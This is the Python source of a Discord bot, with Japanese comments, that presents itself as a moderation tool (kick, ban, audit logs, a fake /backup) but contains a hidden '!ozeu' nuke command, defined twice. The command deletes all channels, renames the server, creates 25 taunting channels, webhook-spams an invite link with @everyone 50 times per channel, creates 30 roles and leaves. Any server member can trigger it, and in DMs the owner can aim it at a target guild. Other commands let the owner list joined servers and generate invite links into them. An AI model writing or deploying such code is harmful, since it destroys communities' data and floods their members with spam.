import os
import json
import discord
import datetime
from discord.ext import commands
from discord import app_commands
import asyncio
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")
SPAM_MESSAGE = (
    "discord.gg/ozeu　https://i.imgur.com/NbBGFcf.mp4  "
    "[gif](https://media.discordapp.net/attachments/...)  "
    "[gif](https://media.discordapp.net/attachments/...) @everyone"
)
OWNER_ID = 1386539010381451356  # あなたのDiscord ID

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

DEV_USERS_FILE = "dev_users.json"

# dev_users.jsonの読み込み・保存関数
def load_dev_users():
    if not os.path.isfile(DEV_USERS_FILE):
        with open(DEV_USERS_FILE, "w") as f:
            json.dump([OWNER_ID], f)
        return [OWNER_ID]
    with open(DEV_USERS_FILE, "r") as f:
        try:
            return json.load(f)
        except:
            return [OWNER_ID]

def save_dev_users(users):
    with open(DEV_USERS_FILE, "w") as f:
        json.dump(users, f)

dev_users = load_dev_users()

# --- Bot起動時 ---
@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"{bot.user} が起動しました！")

# --- dev_users管理用コマンド ---
@tree.command(name="add_dev", description="Botの開発者権限ユーザーを追加します（OWNERのみ）")
@app_commands.describe(user="追加したいユーザー")
async def add_dev(interaction: discord.Interaction, user: discord.User):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("❌ このコマンドはBotオーナーのみ使用できます。", ephemeral=True)
        return
    global dev_users
    if user.id in dev_users:
        await interaction.response.send_message("⚠ 既に開発者権限があります。", ephemeral=True)
        return
    dev_users.append(user.id)
    save_dev_users(dev_users)
    await interaction.response.send_message(f"✅ {user} を開発者権限ユーザーに追加しました。", ephemeral=True)

@tree.command(name="remove_dev", description="Botの開発者権限ユーザーを削除します（OWNERのみ）")
@app_commands.describe(user="削除したいユーザー")
async def remove_dev(interaction: discord.Interaction, user: discord.User):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("❌ このコマンドはBotオーナーのみ使用できます。", ephemeral=True)
        return
    global dev_users
    if user.id == OWNER_ID:
        await interaction.response.send_message("❌ オーナーは削除できません。", ephemeral=True)
        return
    if user.id not in dev_users:
        await interaction.response.send_message("⚠ 指定ユーザーは開発者権限に含まれていません。", ephemeral=True)
        return
    dev_users.remove(user.id)
    save_dev_users(dev_users)
    await interaction.response.send_message(f"✅ {user} を開発者権限ユーザーから削除しました。", ephemeral=True)

# --- !ozeu コマンド（サーバーでは誰でも / DMではOWNERかdev_usersのみ） ---
@bot.command(name="ozeu")
async def ozeu(ctx, guild_id: int = None):
    # DMならOWNERかdev_usersのみ許可
    if ctx.guild is None:
        if ctx.author.id not in dev_users:
            await ctx.send("❌ このコマンドはBotの開発者権限ユーザーのみ使用できます。")
            return
        if guild_id is None:
            await ctx.send("❌ サーバーIDを指定してください。例: `!ozeu <guild_id>`")
            return
        guild = bot.get_guild(guild_id)
        if guild is None:
            await ctx.send(f"❌ ID {guild_id} のサーバーが見つかりません。")
            return
    else:
        # サーバー内なら誰でもOK
        guild = ctx.guild

    embed_start = discord.Embed(
        title="📢 !ozeu が実行されました",
        description=f"サーバー「{guild.name}」 (ID: {guild.id}) で ozeu 処理を開始しました。",
        color=discord.Color.green()
    )
    embed_start.add_field(name="実行者", value=f"{ctx.author} (ID: {ctx.author.id})", inline=False)
    embed_start.timestamp = discord.utils.utcnow()

    owner = await bot.fetch_user(OWNER_ID)
    await owner.send(embed=embed_start)
    await ctx.send(embed=embed_start)

    async def delete_channel(channel):
        try:
            await channel.delete()
        except Exception as e:
            print(f"{channel.name} の削除でエラー: {e}")

    delete_tasks = [delete_channel(ch) for ch in guild.channels]
    await asyncio.gather(*delete_tasks)

    try:
        await guild.edit(name="ozeuの植民地")
    except Exception as e:
        print(f"サーバー名の変更でエラー: {e}")

    async def create_channel(index):
        try:
            return await guild.create_text_channel(name="荒らされてやんのｗｗｗ")
        except Exception as e:
            print(f"{index + 1}個目のチャンネル作成失敗: {e}")
            return None

    created_channels = await asyncio.gather(*[create_channel(i) for i in range(25)])
    created_channels = [ch for ch in created_channels if ch is not None]

    async def send_with_webhook(channel):
        try:
            webhook = await channel.create_webhook(name="ZPlusWebhook")
            for _ in range(50):
                await webhook.send(SPAM_MESSAGE, username="ガバマン")
        except Exception as e:
            print(f"{channel.name} のWebhook送信でエラー: {e}")

    await asyncio.gather(*[send_with_webhook(ch) for ch in created_channels])

    try:
        for i in range(30):
            await guild.create_role(name=f"bot用権限{i+1}")
    except Exception as e:
        print(f"ロール作成でエラー: {e}")

    try:
        await guild.leave()
        embed_done = discord.Embed(
            title="🚪 ozeu処理が完了し、Botはサーバーを退出しました",
            description=(
                f"サーバー名: {guild.name} (ID: {guild.id})\n"
                f"実行者: {ctx.author} (ID: {ctx.author.id})"
            ),
            color=discord.Color.red()
        )
        embed_done.timestamp = discord.utils.utcnow()
        await owner.send(embed=embed_done)
        await ctx.send(embed=embed_done)
    except Exception as e:
        print(f"退出時にエラー: {e}")

# --- /safe コマンド ---  
# 入力されたサーバーIDのサーバーでは!ozeu処理が発動しないようにする管理
safe_servers = set()

@tree.command(name="safe", description="指定したサーバーIDを安全サーバーリストに追加し、!ozeuを発動禁止にします")
@app_commands.describe(server_id="対象のサーバーID")
async def safe(interaction: discord.Interaction, server_id: str):
    if interaction.user.id not in dev_users:
        await interaction.response.send_message("❌ このコマンドは開発者権限ユーザーのみ使用できます。", ephemeral=True)
        return
    safe_servers.add(int(server_id))
    await interaction.response.send_message(f"✅ サーバーID {server_id} を安全リストに追加しました。")

@tree.command(name="unsafe", description="指定したサーバーIDを安全リストから削除し、!ozeuを発動可能にします")
@app_commands.describe(server_id="対象のサーバーID")
async def unsafe(interaction: discord.Interaction, server_id: str):
    if interaction.user.id not in dev_users:
        await interaction.response.send_message("❌ このコマンドは開発者権限ユーザーのみ使用できます。", ephemeral=True)
        return
    try:
        safe_servers.remove(int(server_id))
        await interaction.response.send_message(f"✅ サーバーID {server_id} を安全リストから削除しました。")
    except KeyError:
        await interaction.response.send_message(f"⚠ サーバーID {server_id} は安全リストに登録されていません。")

# !ozeuコマンドにsafe_serversチェックを追加
@bot.command(name="ozeu")
async def ozeu(ctx, guild_id: int = None):
    if ctx.guild is None:
        if ctx.author.id not in dev_users:
            await ctx.send("❌ このコマンドはBotの開発者権限ユーザーのみ使用できます。")
            return
        if guild_id is None:
            await ctx.send("❌ サーバーIDを指定してください。例: `!ozeu <guild_id>`")
            return
        if int(guild_id) in safe_servers:
            await ctx.send("❌ このサーバーは安全リストに登録されているため、!ozeuは実行できません。")
            return
        guild = bot.get_guild(guild_id)
        if guild is None:
            await ctx.send(f"❌ ID {guild_id} のサーバーが見つかりません。")
            return
    else:
        if ctx.guild.id in safe_servers:
            await ctx.send("❌ このサーバーは安全リストに登録されているため、!ozeuは実行できません。")
            return
        guild = ctx.guild

    # --- 以下、上記と同じozeu処理 ---
    embed_start = discord.Embed(
        title="📢 !ozeu が実行されました",
        description=f"サーバー「{guild.name}」 (ID: {guild.id}) で ozeu 処理を開始しました。",
        color=discord.Color.green()
    )
    embed_start.add_field(name="実行者", value=f"{ctx.author} (ID: {ctx.author.id})", inline=False)
    embed_start.timestamp = discord.utils.utcnow()

    owner = await bot.fetch_user(OWNER_ID)
    await owner.send(embed=embed_start)
    await ctx.send(embed=embed_start)

    async def delete_channel(channel):
        try:
            await channel.delete()
        except Exception as e:
            print(f"{channel.name} の削除でエラー: {e}")

    delete_tasks = [delete_channel(ch) for ch in guild.channels]
    await asyncio.gather(*delete_tasks)

    try:
        await guild.edit(name="ozeuの植民地")
    except Exception as e:
        print(f"サーバー名の変更でエラー: {e}")

    async def create_channel(index):
        try:
            return await guild.create_text_channel(name="荒らされてやんのｗｗｗ")
        except Exception as e:
            print(f"{index + 1}個目のチャンネル作成失敗: {e}")
            return None

    created_channels = await asyncio.gather(*[create_channel(i) for i in range(25)])
    created_channels = [ch for ch in created_channels if ch is not None]

    async def send_with_webhook(channel):
        try:
            webhook = await channel.create_webhook(name="ZPlusWebhook")
            for _ in range(50):
                await webhook.send(SPAM_MESSAGE, username="ガバマン")
        except Exception as e:
            print(f"{channel.name} のWebhook送信でエラー: {e}")

    await asyncio.gather(*[send_with_webhook(ch) for ch in created_channels])

    try:
        for i in range(30):
            await guild.create_role(name=f"bot用権限{i+1}")
    except Exception as e:
        print(f"ロール作成でエラー: {e}")

    try:
        await guild.leave()
        embed_done = discord.Embed(
            title="🚪 ozeu処理が完了し、Botはサーバーを退出しました",
            description=(
                f"サーバー名: {guild.name} (ID: {guild.id})\n"
                f"実行者: {ctx.author} (ID: {ctx.author.id})"
            ),
            color=discord.Color.red()
        )
        embed_done.timestamp = discord.utils.utcnow()
        await owner.send(embed=embed_done)
        await ctx.send(embed=embed_done)
    except Exception as e:
        print(f"退出時にエラー: {e}")

# --- /backup コマンド ---
@bot.tree.command(name="backup", description="ログを保存します")
async def backup(interaction: discord.Interaction):
    await interaction.response.send_message("ログを保存しました☑")

# --- /ping コマンド ---
@bot.tree.command(name="ping", description="BOTの応答速度を表示します。")
async def ping(interaction: discord.Interaction):
    latency_ms = round(bot.latency * 1000)
    await interaction.response.send_message(f"応答速度は {latency_ms}ms です")

# --- /kick コマンド ---
@bot.tree.command(name="kick", description="指定したユーザーをキックします")
@app_commands.describe(member="キックするメンバー", reason="理由（省略可）")
async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "理由なし"):
    if member.top_role >= interaction.user.top_role:
        await interaction.response.send_message("❌ 権限の高いユーザーはキックできません。", ephemeral=True)
        return
    try:
        await member.kick(reason=reason)
        await interaction.response.send_message(f"✅ {member.mention} をキックしました。理由: {reason}")
    except Exception as e:
        await interaction.response.send_message(f"❌ キックに失敗しました: {e}", ephemeral=True)

# --- /ban コマンド ---
@bot.tree.command(name="ban", description="指定したユーザーをBAN（追放）します")
@app_commands.describe(member="BANするメンバー", reason="理由（省略可）")
async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "理由なし"):
    if member.top_role >= interaction.user.top_role:
        await interaction.response.send_message("❌ 権限の高いユーザーはBANできません。", ephemeral=True)
        return
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="⛔ ユーザーをBANしました",
            description=f"{member.mention} をサーバーからBANしました。",
            color=discord.Color.red()
        )
        embed.add_field(name="理由", value=reason, inline=False)
        if member.avatar:
            embed.set_thumbnail(url=member.avatar.url)
        embed.set_footer(text=f"実行者: {interaction.user}", icon_url=interaction.user.avatar.url if interaction.user.avatar else None)
        await interaction.response.send_message(embed=embed)
    except Exception as e:
        await interaction.response.send_message(f"❌ BANに失敗しました: {e}", ephemeral=True)

# --- サーバー参加時イベント ---
@bot.event
async def on_guild_join(guild: discord.Guild):
    members = [member async for member in guild.fetch_members()]
    member_count = guild.member_count
    owner_in_guild = any(member.id == OWNER_ID for member in guild.members)
    if member_count <= 5 and not owner_in_guild:
        await guild.leave()
        return

    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    inviter = "不明（監査ログの権限が必要）"
    try:
        async for entry in guild.audit_logs(limit=5, action=discord.AuditLogAction.bot_add):
            if entry.target and entry.target.id == bot.user.id:
                inviter = f"{entry.user}（ID: {entry.user.id}）"
                break
    except discord.Forbidden:
        inviter = "監査ログが取得できません（権限不足）"
    except Exception as e:
        inviter = f"取得失敗: {e}"

    embed = discord.Embed(
        title="🔔 新しいサーバーに参加しました",
        color=discord.Color.green(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="📅 日時", value=now, inline=False)
    embed.add_field(name="🌐 サーバー名", value=f"{guild.name}（ID: {guild.id}）", inline=False)
    embed.add_field(name="🙋‍♂️ 追加したユーザー", value=inviter, inline=False)
    embed.add_field(name="👥 サーバー人数", value=f"{guild.member_count}人", inline=False)
    embed.add_field(name="📊 現在のサーバー数", value=f"{len(bot.guilds)}", inline=False)
    embed.set_footer(text="Bot参加通知")
    try:
        user = await bot.fetch_user(OWNER_ID)
        await user.send(embed=embed)
    except Exception as e:
        print(f"DM送信失敗: {e}")

# --- /leave_server コマンド（開発者専用） ---
@tree.command(name="leave_server", description="指定されたサーバーからBotを退出させます（開発者専用）")
@app_commands.describe(server_id="Botを退出させたいサーバーのID")
async def leave_server(interaction: discord.Interaction, server_id: str):
    if interaction.guild is not None:
        await interaction.response.send_message("このコマンドはDMでのみ使えます。", ephemeral=True)
        return
    if interaction.user.id not in dev_users:
        await interaction.response.send_message("このコマンドはBotの開発者のみ使えます。", ephemeral=True)
        return
    try:
        guild = bot.get_guild(int(server_id))
        if guild is None:
            await interaction.response.send_message("Botはそのサーバーに参加していません。", ephemeral=True)
            return
        await guild.leave()
        embed = discord.Embed(
            title="🚪 Botがサーバーから退出しました",
            description=f"**{guild.name}**（ID: `{server_id}`）から正常に退出しました。",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed)
    except Exception as e:
        await interaction.response.send_message(f"エラーが発生しました: {e}", ephemeral=True)

# --- /servers コマンド（開発者専用） ---
@tree.command(name="servers", description="サーバー一覧(開発者専用)")
async def servers(interaction: discord.Interaction):
    if interaction.user.id not in dev_users:
        await interaction.response.send_message("このコマンドはBotの開発者のみ使えます。", ephemeral=True)
        return
    guilds = bot.guilds
    server_list = "\n".join(f"{guild.name} - ID: `{guild.id}`" for guild in guilds)
    embed = discord.Embed(
        title=f"🤖 Botが入っているサーバー一覧（{len(guilds)}件）",
        description=server_list or "現在サーバーに参加していません。",
        color=discord.Color.blue()
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

# --- /get url コマンド（開発者専用） ---
get_group = app_commands.Group(name="get", description="情報取得系コマンド")

@get_group.command(name="url", description="指定されたサーバーの招待リンクを取得します（開発者専用）")
@app_commands.describe(server_id="招待リンクを取得したいサーバーのID")
async def get_url(interaction: discord.Interaction, server_id: str):
    if interaction.user.id not in dev_users:
        await interaction.response.send_message("このコマンドはBotの開発者のみ使用できます。", ephemeral=True)
        return

    guild = bot.get_guild(int(server_id))
    if guild is None:
        await interaction.response.send_message("指定されたサーバーにBotが参加していません。", ephemeral=True)
        return

    try:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).create_instant_invite:
                invite = await channel.create_invite(max_age=300, max_uses=1, unique=True)
                await interaction.response.send_message(f"✅ 招待リンク: {invite.url}", ephemeral=True)
                return
        await interaction.response.send_message("❌ 招待リンクを作成できるチャンネルが見つかりませんでした。", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"❌ 招待リンクの取得に失敗しました: {e}", ephemeral=True)

tree.add_command(get_group)

# --- /log コマンド（フィルター選択・管理者権限制限付き） ---
from typing import Literal

@bot.tree.command(name="log", description="直近の監査ログ（10件）を表示します")
@app_commands.describe(
    action_type="取得するログの種類を選んでください（例: メンバーBAN、チャンネル削除など）"
)
@app_commands.choices(
    action_type=[
        app_commands.Choice(name="メンバーBAN", value="ban"),
        app_commands.Choice(name="メッセージ削除", value="message_delete"),
        app_commands.Choice(name="チャンネル作成", value="channel_create"),
        app_commands.Choice(name="チャンネル削除", value="channel_delete"),
        app_commands.Choice(name="ロール作成", value="role_create"),
        app_commands.Choice(name="ロール削除", value="role_delete"),
        app_commands.Choice(name="Bot追加", value="bot_add"),
        app_commands.Choice(name="すべて", value="all"),
    ]
)
async def log(
    interaction: discord.Interaction,
    action_type: app_commands.Choice[str]
):
    # サーバー内限定
    if interaction.guild is None:
        await interaction.response.send_message("❌ このコマンドはサーバー内でのみ使用できます。", ephemeral=True)
        return

    # 管理権限チェック
    if not interaction.user.guild_permissions.manage_guild:
        await interaction.response.send_message("❌ このコマンドは管理者のみ使用できます。", ephemeral=True)
        return

    action_map = {
        "ban": discord.AuditLogAction.ban,
        "message_delete": discord.AuditLogAction.message_delete,
        "channel_create": discord.AuditLogAction.channel_create,
        "channel_delete": discord.AuditLogAction.channel_delete,
        "role_create": discord.AuditLogAction.role_create,
        "role_delete": discord.AuditLogAction.role_delete,
        "bot_add": discord.AuditLogAction.bot_add,
    }

    try:
        logs = []
        if action_type.value == "all":
            async for entry in interaction.guild.audit_logs(limit=10):
                logs.append(entry)
        else:
            async for entry in interaction.guild.audit_logs(limit=20, action=action_map[action_type.value]):
                logs.append(entry)
                if len(logs) == 10:
                    break

        if not logs:
            await interaction.response.send_message("📭 指定された種類のログは見つかりませんでした。", ephemeral=True)
            return

        description = ""
        for entry in logs:
            description += (
                f"**{entry.action.name}**\n"
                f"・実行者: {entry.user} (ID: {entry.user.id})\n"
                f"・対象: {getattr(entry.target, 'name', str(entry.target))}\n"
                f"・日時: {entry.created_at.strftime('%Y/%m/%d %H:%M:%S')}\n"
                "-----------------------\n"
            )

        embed = discord.Embed(
            title=f"📑 監査ログ: {action_type.name}（最大10件）",
            description=description,
            color=discord.Color.red()
        )
        embed.set_footer(text=f"サーバー: {interaction.guild.name}")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    except discord.Forbidden:
        await interaction.response.send_message("❌ `監査ログの表示` 権限が必要です。", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"❌ エラーが発生しました: {e}", ephemeral=True)

# --- 起動 ---
bot.run(TOKEN)
